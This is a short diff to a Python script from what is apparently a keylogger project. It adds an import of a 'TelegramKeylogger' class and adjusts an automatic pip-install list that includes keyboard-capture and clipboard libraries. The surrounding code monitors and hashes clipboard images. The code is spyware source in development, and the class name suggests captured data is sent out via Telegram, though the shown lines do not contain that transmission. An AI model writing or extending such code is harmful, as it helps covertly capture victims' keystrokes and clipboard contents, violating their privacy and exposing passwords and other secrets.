@@ -1,10 +1,11 @@
 import subprocess
 import sys
 import io
+from KeyloggerManager import TelegramKeylogger
 
 def install_packages():
     packages = [
-        "PIL", "hashlib", "pywin32", "pynput", "pyautogui", "python-dotenv", "requests", "pyperclip"
+        "Pillow", "hashlib", "pywin32", "pynput", "pyautogui", "python-dotenv", "requests", "pyperclip"
     ]
     for package in packages:
         subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
@@ -196,6 +197,7 @@ def clipboard_monitor(interval=5):
 
         try:
             image = ImageGrab.grabclipboard()
+
             if image is not None:
                 # Создаем хэш изображения для сравнения
                 img_bytes = io.BytesIO()
